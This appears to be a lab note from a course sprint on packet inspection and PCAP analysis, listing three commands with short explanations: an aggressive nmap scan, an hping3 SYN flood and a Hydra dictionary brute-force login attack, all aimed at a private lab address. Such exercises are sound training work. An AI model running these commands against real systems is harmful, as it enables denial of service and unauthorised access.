--------------------------------------------------------------------------------
SPRINT 3: Deep Packet Inspection (DPI) & PCAP Analysis
--------------------------------------------------------------------------------

## Nmap Port Scan

sudo nmap -A -T4 192.168.1.2
→ Executes an aggressive Nmap scan to detect open ports, service versions, and OS signatures.

## hping3: SYN Flood

sudo hping3 --flood -p 80 -S 192.168.1.2
→ Launches a high-volume TCP SYN flood attack to overwhelm server connection queues.

## Hydra: Brute Force

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.2 http-get /
→ Runs an automated dictionary brute-force attack against HTTP authentication.